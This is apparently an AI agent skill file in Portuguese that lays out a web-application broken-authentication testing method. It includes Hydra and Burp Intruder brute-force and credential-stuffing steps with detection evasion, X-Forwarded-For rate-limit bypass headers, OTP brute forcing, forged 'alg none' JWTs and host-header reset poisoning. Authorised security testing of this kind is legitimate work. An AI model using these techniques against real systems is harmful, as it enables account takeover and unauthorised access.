---
name: Broken Authentication Testing
description: Esta habilidade deve ser usada quando o usuário pede para "testar vulnerabilidades de autenticação quebrada", "avaliar segurança de gerenciamento de sessão", "realizar testes de credential stuffing", "avaliar políticas de senha", "testar fixação de sessão" ou "identificar falhas de bypass de autenticação". Fornece técnicas abrangentes para identificar fraquezas de autenticação e gerenciamento de sessão em aplicações web.
metadata:
  author: zebbern
  version: "1.1"
---

# Broken Authentication Testing

## Propósito

Identificar e explorar vulnerabilidades de autenticação e gerenciamento de sessão em aplicações web. Autenticação quebrada é consistentemente classificada no OWASP Top 10 e pode levar a sequestro de conta, roubo de identidade e acesso não autorizado a sistemas sensíveis. Esta habilidade abrange metodologias de teste para políticas de senha, tratamento de sessão, autenticação multifator e gerenciamento de credenciais.

## Pré-requisitos

### Conhecimento Obrigatório
- Protocolo HTTP e mecanismos de sessão
- Tipos de autenticação (SFA, 2FA, MFA)
- Tratamento de cookies e tokens
- Frameworks de autenticação comuns

### Ferramentas Necessárias
- Burp Suite Professional ou Community
- Hydra ou ferramentas de brute-force similares
- Listas de palavras personalizadas para teste de credenciais
- Ferramentas de desenvolvedor do navegador

### Acesso Necessário
- URL da aplicação alvo
- Credenciais de conta de teste
- Autorização escrita para testes

## Saídas e Entregáveis

1. **Relatório de Avaliação de Autenticação** - Documentar todas as vulnerabilidades identificadas
2. **Resultados de Teste de Credencial** - Resultados de ataque de brute-force e dicionário
3. **Análise de Segurança de Sessão** - Avaliação de aleatoriedade de token e timeout
4. **Recomendações de Remediação** - Orientações de endurecimento de segurança

## Fluxo de Trabalho Principal

### Fase 1: Análise do Mecanismo de Autenticação

Entender a arquitetura de autenticação da aplicação:

```
# Identificar tipo de autenticação
- Baseada em senha (formulários, autenticação básica, digest)
- Baseada em token (JWT, OAuth, chaves de API)
- Baseada em certificado (TLS mútuo)
- Multifator (SMS, TOTP, tokens de hardware)

# Mapear endpoints de autenticação
/login, /signin, /authenticate
/register, /signup
/forgot-password, /reset-password
/logout, /signout
/api/auth/*, /oauth/*
```

Capturar e analisar requisições de autenticação:

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test123
```

### Fase 2: Teste de Política de Senha

Avaliar requisitos de senha e sua aplicação:

```bash
# Teste de comprimento mínimo (a, ab, abcdefgh)
# Teste de complexidade (password, password1, Password1!)
# Teste de senhas fracas comuns (123456, password, qwerty, admin)
# Teste de nome de usuário como senha (admin/admin, test/test)
```

Documentar lacunas de política: Comprimento mínimo < 8, sem complexidade, senhas comuns permitidas, nome de usuário como senha.

### Fase 3: Enumeração de Credenciais

Teste de vulnerabilidades de enumeração de nome de usuário:

```bash
# Comparar respostas para nomes de usuário válidos vs inválidos
# Inválido: "Invalid username" vs Válido: "Invalid password"
# Verificar diferenças de tempo, códigos de resposta, mensagens de registro
```

# Redefinição de senha
"Email enviado se a conta existe" (seguro)
"Nenhuma conta com esse email" (vaza informação)

# Respostas de API
{"error": "user_not_found"}
{"error": "invalid_password"}
```

### Fase 4: Teste de Brute Force

Teste de bloqueio de conta e limitação de taxa:

```bash
# Usando Hydra para autenticação baseada em formulário
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Usando Burp Intruder
1. Capturar requisição de login
2. Enviar para Intruder
3. Definir posições de payload no campo de senha
4. Carregar wordlist
5. Iniciar ataque
6. Analisar comprimentos de resposta/códigos
```

Verificar proteções:

```bash
# Bloqueio de conta
- Após quantas tentativas?
- Duração do bloqueio?
- Notificação de bloqueio?

# Limitação de taxa
- Limite de requisições por minuto?
- Baseado em IP ou conta?
- Bypass via headers (X-Forwarded-For)?

# CAPTCHA
- Após tentativas falhadas?
- Facilmente contornável?
```

### Fase 5: Credential Stuffing

Teste com credenciais conhecidas que vazaram:

```bash
# Credential stuffing difere de brute force
# Usa pares email:senha conhecidos de vazamentos

# Usando Burp Intruder com ataque Pitchfork
1. Definir nome de usuário e senha como posições
2. Carregar lista de email como payload 1
3. Carregar lista de senha como payload 2 (pares combinados)
4. Analisar para logins bem-sucedidos

# Evasão de detecção
- Taxa de requisição lenta
- Rotacionar IPs de origem
- Randomizar user agents
- Adicionar delays entre tentativas
```

### Fase 6: Teste de Gerenciamento de Sessão

Analisar segurança de token de sessão:

```bash
# Capturar cookie de sessão
Cookie: SESSIONID=abc123def456

# Teste de características de token
1. Entropia - É aleatório o suficiente?
2. Comprimento - Comprimento suficiente (128+ bits)?
3. Previsibilidade - Padrões sequenciais?
4. Flags seguras - HttpOnly, Secure, SameSite?
```

Análise de token de sessão:

```python
#!/usr/bin/env python3
import requests
import hashlib

# Coletar múltiplos tokens de sessão
tokens = []
for i in range(100):
    response = requests.get("https://target.com/login")
    token = response.cookies.get("SESSIONID")
    tokens.append(token)

# Analisar padrões
# Verificar incrementos sequenciais
# Calcular entropia
# Procurar componentes de timestamp
```

### Fase 7: Teste de Fixação de Sessão

Teste se a sessão é regenerada após autenticação:

```bash
# Passo 1: Obter sessão antes do login
GET /login HTTP/1.1
Response: Set-Cookie: SESSIONID=abc123

# Passo 2: Fazer login com a mesma sessão
POST /login HTTP/1.1
Cookie: SESSIONID=abc123
username=valid&password=valid

# Passo 3: Verificar se a sessão mudou
# VULNERÁVEL se SESSIONID permanece abc123
# SEGURO se nova sessão é atribuída após login
```

Cenário de ataque:

```bash
# Fluxo de trabalho do atacante:
1. Atacante visita site, obtém sessão: SESSIONID=attacker_session
2. Atacante envia link para vítima com sessão fixa:
   https://target.com/login?SESSIONID=attacker_session
3. Vítima faz login com sessão do atacante
4. Atacante agora tem sessão autenticada
```

### Fase 8: Teste de Timeout de Sessão

Verificar políticas de expiração de sessão:

```bash
# Teste de timeout de inatividade
1. Fazer login e anotar cookie de sessão
2. Esperar sem atividade (15, 30, 60 minutos)
3. Tentar usar a sessão
4. Verificar se a sessão ainda é válida

# Teste de timeout absoluto
1. Fazer login e usar sessão continuamente
2. Verificar se há logout forçado após período definido (8 horas, 24 horas)

# Teste de funcionalidade de logout
1. Fazer login e anotar sessão
2. Clicar em logout
3. Tentar reutilizar cookie de sessão antigo
4. Sessão deve ser invalidada no lado do servidor
```

### Fase 9: Teste de Autenticação Multifator

Avaliar segurança da implementação de MFA:

```bash
# Brute force de OTP
- OTP de 4 dígitos = 10.000 combinações
- OTP de 6 dígitos = 1.000.000 combinações
- Teste limitação de taxa no endpoint de OTP

# Técnicas de bypass de OTP
- Pular etapa de MFA acessando URL diretamente
- Modificar resposta para indicar que MFA passou
- Submissão de OTP nulo/vazio
- Reutilização de OTP válido anterior

# Ataque de Downgrade de Versão de API (exemplo crAPI)
# Se /api/v3/check-otp tem limitação de taxa, tente versões antigas:
POST /api/v2/check-otp
{"otp": "1234"}
# Versões antigas de API podem não ter controles de segurança

# Usando Burp para teste de OTP
1. Capturar requisição de verificação de OTP
2. Enviar para Intruder
3. Definir campo de OTP como posição de payload
4. Usar payload de números (0000-9999)
5. Verificar bypass bem-sucedido
```

Teste de inscrição em MFA:

```bash
# Inscrição forçada
- MFA pode ser pulado durante a configuração?
- Códigos de backup podem ser acessados sem verificação?

# Processo de recuperação
- MFA pode ser desabilitado apenas via email?
- Potencial de engenharia social?
```

### Fase 10: Teste de Redefinição de Senha

Analisar segurança de redefinição de senha:

```bash
# Segurança de token
1. Requisitar redefinição de senha
2. Capturar link de redefinição
3. Analisar token:
   - Comprimento e aleatoriedade
   - Tempo de expiração
   - Aplicação de uso único
   - Vínculo com conta

# Manipulação de token
https://target.com/reset?token=abc123&user=victim
# Tentar alterar parâmetro de usuário enquanto usa token válido

# Injeção de host header
POST /forgot-password HTTP/1.1
Host: attacker.com
email=victim@email.com
# Email de redefinição pode conter domínio do atacante
```

## Referência Rápida

### Tipos de Vulnerabilidade Comuns

| Vulnerabilidade | Risco | Método de Teste |
|--------------|------|-------------|
| Senhas fracas | Alto | Teste de política, ataque de dicionário |
| Sem bloqueio | Alto | Teste de brute force |
| Enumeração de nome de usuário | Médio | Análise de resposta diferencial |
| Fixação de sessão | Alto | Comparação de sessão pré/pós-login |
| Tokens de sessão fracos | Alto | Análise de entropia |
| Sem timeout de sessão | Médio | Teste de sessão de longa duração |
| Redefinição de senha insegura | Alto | Análise de token, bypass de fluxo |
| Bypass de MFA | Crítico | Acesso direto, manipulação de resposta |

### Payloads de Teste de Credencial

```bash
# Credenciais padrão
admin:admin
admin:password
admin:123456
root:root
test:test
user:user

# Senhas comuns
123456
password
12345678
qwerty
abc123
password1
admin123

# Bancos de dados de credenciais vazadas
- Dataset Have I Been Pwned
- Senhas SecLists
- Listas personalizadas direcionadas
```

### Flags de Cookie de Sessão

| Flag | Propósito | Vulnerabilidade se Ausente |
|------|---------|------------------------|
| HttpOnly | Previne acesso JS | XSS pode roubar sessão |
| Secure | Apenas HTTPS | Enviado via HTTP |
| SameSite | Proteção CSRF | Requisições cross-site permitidas |
| Path | Escopo de URL | Exposição mais ampla |
| Domain | Escopo de domínio | Acesso de subdomínio |
| Expires | Tempo de vida | Sessões persistentes |

### Headers de Bypass de Limitação de Taxa

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

## Restrições e Limitações

### Requisitos Legais
- Testar apenas com autorização escrita explícita
- Evitar teste com credenciais reais vazadas
- Não acessar contas de usuários reais
- Documentar todas as atividades de teste

### Limitações Técnicas
- CAPTCHA pode impedir testes automatizados
- Limitação de taxa afeta timing de brute force
- MFA aumenta significativamente a dificuldade de ataque
- Algumas vulnerabilidades requerem interação com vítima

### Considerações de Escopo
- Contas de teste podem se comportar diferente da produção
- Alguns recursos podem estar desabilitados em ambientes de teste
- Autenticação de terceiros pode estar fora do escopo
- Testes em produção requerem cuidado extra

## Exemplos

### Exemplo 1: Bypass de Bloqueio de Conta

**Cenário:** Testar se o bloqueio de conta pode ser contornado

```bash
# Passo 1: Identificar limite de bloqueio
# Tentar 5 senhas incorretas para conta admin
# Resultado: "Account locked for 30 minutes"

# Passo 2: Testar bypass via rotação de IP
# Usar header X-Forwarded-For
POST /login HTTP/1.1
X-Forwarded-For: 192.168.1.1
username=admin&password=attempt1

# Incrementar IP para cada tentativa
X-Forwarded-For: 192.168.1.2
# Continuar até sucesso ou bloqueio confirmado

# Passo 3: Testar bypass via manipulação de case
username=Admin (vs admin)
username=ADMIN
# Alguns sistemas tratam estes como contas diferentes
```

### Exemplo 2: Ataque de Token JWT

**Cenário:** Explorar implementação fraca de JWT

```bash
# Passo 1: Capturar token JWT
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature

# Passo 2: Decodificar e analisar
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"user":"test","role":"user"}

# Passo 3: Tentar ataque de algoritmo "none"
# Alterar header para: {"alg":"none","typ":"JWT"}
# Remover assinatura
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIn0.

# Passo 4: Submeter token modificado
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

### Exemplo 3: Exploração de Token de Redefinição de Senha

**Cenário:** Testar funcionalidade de redefinição de senha

```bash
# Passo 1: Requisitar redefinição para conta de teste
POST /forgot-password
email=test@example.com

# Passo 2: Capturar link de redefinição
https://target.com/reset?token=a1b2c3d4e5f6

# Passo 3: Testar propriedades de token
# Reutilização: Tentar usar o mesmo token duas vezes
# Expiração: Esperar 24+ horas e tentar novamente
# Modificação: Alterar caracteres no token

# Passo 4: Testar manipulação de parâmetro de usuário
https://target.com/reset?token=a1b2c3d4e5f6&email=admin@example.com
# Verificar se a senha do admin pode ser redefinida com token do usuário de teste
```

## Resolução de Problemas

| Problema | Soluções |
|-------|-----------|
| Brute force muito lento | Identificar escopo de limite de taxa; rotação de IP; adicionar delays; usar wordlists direcionadas |
| Análise de sessão inconclusiva | Coletar 1000+ tokens; usar ferramentas estatísticas; verificar timestamps; comparar contas |
| MFA não pode ser contornada | Documentar como seguro; testar mecanismos de backup/recuperação; verificar fadiga de MFA; validar inscrição |
| Bloqueio de conta impede testes | Requisitar múltiplas contas de teste; testar limite primeiro; usar timing mais lento |